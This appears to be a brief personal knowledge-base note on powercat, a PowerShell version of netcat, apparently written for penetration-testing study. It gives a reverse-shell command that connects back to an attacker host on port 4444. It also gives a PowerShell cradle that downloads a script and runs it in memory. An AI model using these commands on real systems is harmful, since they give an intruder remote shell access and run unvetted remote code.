---
tags:
  - type/tool
Link: https://github.com/besimorhino/powercat
Purpose: the powershell version of netcat
---
# Info
Basically the same as [[3 Tools/shells/Netcat|Netcat]], but for windows
supports setting up listeners & connecting to listeners using multiple protocols, etc. 
# Usage
Example:
`powercat -c 192.168.x.x -p 4444 -e powershell`

[[2 Tech-Specifics/OS/Windows/PowerShell|PowerShell]] command to download powercat:
`IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');`
# Snippets
